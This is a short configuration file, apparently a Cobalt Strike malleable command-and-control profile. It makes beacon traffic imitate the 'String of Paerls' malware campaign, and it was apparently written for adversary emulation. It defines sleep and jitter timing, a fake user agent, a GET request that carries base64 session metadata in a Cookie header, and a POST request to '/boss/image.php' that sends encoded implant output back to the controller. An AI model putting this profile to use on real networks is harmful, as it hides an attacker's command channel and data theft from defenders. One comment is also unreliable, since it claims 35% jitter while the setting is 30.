#
# String of Paerls profile
#   http://blogs.cisco.com/security/a-string-of-paerls/
#
# Author: @harmj0y
#

set sleeptime "30000"; # use a ~30 second main interval
set jitter    "30"; # 35% jitter
set maxdns    "255";
set useragent "Mozilla/4.0";

http-get {

    # GET request modeled as well as possible based on incomplete information
    set uri "/2/R.exe";

    client {
        
        header "Content-Type" "application/x-www-form-urlencoded";

        # encode session metadata
        metadata {
            base64;
            header "Cookie";
        }
    }

    server {
        header "Server" "Apache/2";
        header "X-Powered-By" "PHP/5.3.28";
        header "Vary" "User-Agent";
        header "Content-Type" "application/octet-stream";

        output {
            print;
        }
    }
}

http-post {

    set uri "/boss/image.php";

    client {
        
        header "Content-Type" "application/x-www-form-urlencoded";

        id {
            netbios;
            parameter "id";
        }

        output {
            base64;
            print;
        }
    }

    server {
        header "Server" "Apache/2";
        header "X-Powered-By" "PHP/5.3.28";
        header "Vary" "User-Agent";
        header "Content-Type" "application/octet-stream";

        output {
            print;
        }
    }
}

